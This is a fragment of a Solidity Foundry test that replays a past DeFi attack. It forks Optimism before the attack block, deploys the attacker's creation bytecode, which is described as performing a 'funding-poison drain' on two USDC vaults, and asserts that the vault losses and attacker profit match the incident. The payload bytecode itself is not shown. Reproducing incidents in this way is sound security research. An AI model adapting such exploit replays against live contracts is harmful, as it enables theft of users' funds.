    function setUp() public {
        // Fork one block before the attack: vaults still funded, no poison applied yet.
        vm.createSelectFork("optimism", ATTACK_BLOCK - 1);
        vm.label(ATTACKER, "AttackerEOA");
        vm.label(VAULT_MARKET1, "Vault#1");
        vm.label(VAULT_MARKET2, "Vault#2");
        vm.label(address(USDC), "USDC.e");
    }

    function testExploit() public {
        uint256 eoaBefore = USDC.balanceOf(ATTACKER);
        uint256 vault1Before = USDC.balanceOf(VAULT_MARKET1);
        uint256 vault2Before = USDC.balanceOf(VAULT_MARKET2);
        emit log_named_decimal_uint("attacker EOA USDC before", eoaBefore, 6);
        emit log_named_decimal_uint("vault#1 USDC before", vault1Before, 6);
        emit log_named_decimal_uint("vault#2 USDC before", vault2Before, 6);

        // Faithful replay: deploy the exact creation bytecode. The constructor performs the
        // whole funding-poison drain against both markets and forwards USDC to the attacker EOA.
        bytes memory code = ATTACK_INITCODE;
        address deployed;
        assembly {
            deployed := create(0, add(code, 0x20), mload(code))
        }
        require(deployed != address(0), "attack deployment reverted");

        uint256 eoaAfter = USDC.balanceOf(ATTACKER);
        uint256 vault1After = USDC.balanceOf(VAULT_MARKET1);
        uint256 vault2After = USDC.balanceOf(VAULT_MARKET2);
        emit log_named_decimal_uint("attacker EOA USDC after", eoaAfter, 6);
        emit log_named_decimal_uint("attacker profit", eoaAfter - eoaBefore, 6);
        emit log_named_decimal_uint("vault#1 USDC after", vault1After, 6);
        emit log_named_decimal_uint("vault#2 USDC after", vault2After, 6);

        // Assert the drain matches the incident exactly.
        uint256 vault1Loss = vault1Before - vault1After;
        uint256 vault2Loss = vault2Before - vault2After;
        assertEq(vault1Loss, 71_777_612, "vault#1 loss mismatch");
        assertEq(vault2Loss, 2_990_435_495, "vault#2 loss mismatch");
        assertEq(eoaAfter - eoaBefore, 3_062_213_107, "attacker gain mismatch");
        // Attacker gain equals the two vaults' combined loss (no value left in the drainer).
        assertEq(eoaAfter - eoaBefore, vault1Loss + vault2Loss, "gain != combined vault loss");
    }
